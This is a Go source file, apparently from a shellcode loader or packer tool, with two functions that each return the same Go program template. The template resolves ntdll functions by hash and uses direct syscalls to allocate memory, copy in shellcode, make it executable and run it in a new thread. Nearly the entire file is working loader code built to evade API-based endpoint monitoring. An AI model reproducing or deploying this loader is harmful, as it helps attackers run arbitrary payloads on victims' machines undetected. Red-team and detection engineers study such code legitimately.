package loaders

import "fmt"

func GetNtCreateThreadExTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	return fmt.Sprintf(`
package main

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	loader "github.com/cmepw/myph/internals"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

func ExecuteOrderSixtySix(shellcode []byte) {

    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()


    var addr uintptr
	regionsize := uintptr(len(shellcode))

    NtAllocateVirtualMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "32b0ac787d4dba31", ntdll)
	if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedSyscall(
		NtAllocateVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

    if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
        log.Fatal("Error: non-zero return value")
    }

    NtWriteVirtualMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "9ca2ab4726e0ba31", ntdll)
	if err != nil {
		log.Fatal(err)
	}

    rvalue = loader.HashedSyscall(
        NtWriteVirtualMemory,
		uintptr(0xffffffffffffffff),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
    )

    if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
        log.Fatal("Error: non-zero return value")
    }

	var oldProtect uintptr
    NtProtectVirtualMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "a9a7b2ecdd745a31", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue = loader.HashedSyscall(
        NtProtectVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
    )


    if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
        log.Fatal("Error: non-zero return value")
    }

	var hhosthread uintptr
    NtCreateThreadEx, err := loader.LoadFunctionFromHash(loader.HashDJB2, "76d3925c21b6534a", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue =  loader.HashedSyscall(
        NtCreateThreadEx,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		addr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
    )

	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)

	if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
		log.Fatal("non-zero return value returned")
	}
}
    `)

}

func GetNtCreateThreadExAPIHashTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	return fmt.Sprintf(`
package main

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	loader "github.com/cmepw/myph/internals"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

func ExecuteOrderSixtySix(shellcode []byte) {

    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()


    var addr uintptr
	regionsize := uintptr(len(shellcode))

    NtAllocateVirtualMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "32b0ac787d4dba31", ntdll)
	if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedSyscall(
		NtAllocateVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

    if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
        log.Fatal("Error: non-zero return value")
    }

    NtWriteVirtualMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "9ca2ab4726e0ba31", ntdll)
	if err != nil {
		log.Fatal(err)
	}

    rvalue = loader.HashedSyscall(
        NtWriteVirtualMemory,
		uintptr(0xffffffffffffffff),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
    )

    if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
        log.Fatal("Error: non-zero return value")
    }

	var oldProtect uintptr
    NtProtectVirtualMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "a9a7b2ecdd745a31", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue = loader.HashedSyscall(
        NtProtectVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
    )


    if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
        log.Fatal("Error: non-zero return value")
    }

	var hhosthread uintptr
    NtCreateThreadEx, err := loader.LoadFunctionFromHash(loader.HashDJB2, "76d3925c21b6534a", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue =  loader.HashedSyscall(
        NtCreateThreadEx,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		addr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
    )

	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)

	if rvalue != 0 {
        fmt.Printf("Return value: %%x\n", rvalue)
		log.Fatal("non-zero return value returned")
	}
}
    `)

}
